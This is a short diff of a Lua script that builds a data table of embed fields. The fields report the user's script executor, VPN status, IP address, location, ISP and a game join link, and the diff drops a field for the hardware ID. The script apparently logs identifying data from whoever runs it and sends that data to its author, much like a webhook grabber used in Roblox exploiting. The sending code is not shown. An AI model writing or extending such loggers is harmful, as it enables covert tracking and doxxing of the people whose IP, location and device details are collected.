@@ -65,7 +65,6 @@ local data = {
             { name = "Executor", value = executor, inline = true },
             { name = "VPN", value = isVPN, inline = true },
             { name = "IP", value = "`" .. ip .. "`", inline = false },
-            { name = "HWID", value = "`" .. gethwid() .. "`", inline = false },
             { name = "Location", value = flag .. " " .. location, inline = false },
             { name = "ISP", value = isp, inline = false },
             { name = "Join Game", value = " " .. joinLink .. " ", inline = false }
